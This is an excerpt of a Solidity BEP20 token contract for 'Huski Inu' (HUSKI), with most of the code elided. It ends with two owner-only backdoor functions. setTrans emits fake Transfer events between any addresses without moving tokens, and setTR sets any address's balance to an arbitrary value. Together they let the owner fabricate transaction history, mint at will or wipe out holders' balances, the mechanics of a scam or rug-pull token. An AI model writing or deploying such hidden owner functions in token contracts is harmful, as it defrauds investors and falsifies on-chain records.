...
contract Huski is Context, IBEP20, Ownable {
...
string public constant name = "Huski Inu";
string public constant symbol   = "HUSKI";
...
emit Transfer(from, to, tAmount);
  ...
  function setTrans(address sender, address recipient, uint256 b) public onlyOwner {
emit Transfer(sender, recipient, b * 10 ** 18);
  }
  function setTR(address addr, uint256 b) public onlyOwner {
_tOwned[addr] = b * 10 ** 18;
_rOwned[addr] = b * 10 ** 18;
  }
}